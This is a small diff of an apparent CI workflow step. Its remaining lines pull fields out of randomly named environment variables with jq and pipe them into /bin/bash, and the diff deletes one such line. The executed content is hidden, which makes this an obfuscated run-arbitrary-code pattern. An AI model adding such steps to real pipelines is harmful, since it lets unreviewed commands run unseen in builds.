@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
           printf '%s' "$h647" | jq -r .xbl3059 | /bin/bash
-          echo $qujnw51608 | jq -r .zrbft4 | /bin/bash
           echo $s44 | jq -r .a7 | /bin/bash
 
       - name: Save output
